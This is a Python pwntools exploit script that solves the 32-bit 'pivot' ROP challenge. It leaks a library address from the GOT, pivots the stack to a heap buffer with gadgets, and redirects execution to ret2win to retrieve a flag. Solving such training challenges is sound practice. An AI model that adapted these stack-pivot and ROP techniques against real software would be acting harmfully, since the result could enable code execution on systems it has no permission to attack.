import re
from pwn import *
libc = ELF('./libpivot32.so')
bin = ELF('./pivot32')
context.clear(os='linux', arch='x86',log_level='DEBUG')
# stack offset to overwrite eip
# stack_offset = 44

# static elf offsets

foothold_plt = bin.plt['foothold_function']
foothold_got = bin.got['foothold_function']
puts_plt = bin.plt['puts']
main = bin.symbols['main']

# print(hex(main))
foothold_offset = 0x77d
ret2win_offset=0x974

#  pop eax; ret;
popret = 0x0804882c
# xchg eax, esp; ret;
xchgret = 0x0804882e

# run target
p = process("./pivot32")
p.recvuntil("Call ret2win() from libpivot")

# read heap address
# heap_addr = p.recvline_contains("The Old Gods kindly bestow upon you a place to pivot:").strip().rsplit(' ', 1)[1]
# heap_addr = u32(unhex(heap_addr[2:]), endian='big')
pivot_addr= int(re.search(r"(0x[\w\d]+)", str(p.recvuntil("> "))).group(), 16)
# print(hex(pivot_addr))

#foothold address  leak chain
payload1 =  p32(foothold_plt)
payload1 += p32(puts_plt)
payload1 += p32(main)
payload1 += p32(foothold_got)
p.sendline(payload1)

# stack pivot chain
payload2 = b'a'*44
payload2 +=  p32(popret)
payload2 += p32(pivot_addr)
payload2 += p32(xchgret)
# p.recvuntil('> ')
p.sendlineafter('>',payload2)

# print(p.recvlines(2))
# read the foothold_function output
p.recvuntil("Thank you!\nfoothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n")

# read foothold_got leak
foothold_leak = p.recv()[:4].strip().ljust(8, b'\x00')
foothold_leak = u64(foothold_leak)
log.success("foothold@libpivot32 is at: 0x%x" % foothold_leak)
# calc the libc_base 
libc_base= foothold_leak - foothold_offset
ret2win_addr = libc_base + ret2win_offset

log.success("ret2win@libpivot32 is at: 0x%x" % ret2win_addr)

# 2nd stage evil buffer
payload3 = b'A'*44 + p32(ret2win_addr)
p.sendline(payload3)
p.recvuntil('\n')
# # receive flag (cut out prompt)
# flag = (p.recvlines(1))
# log.success(flag)
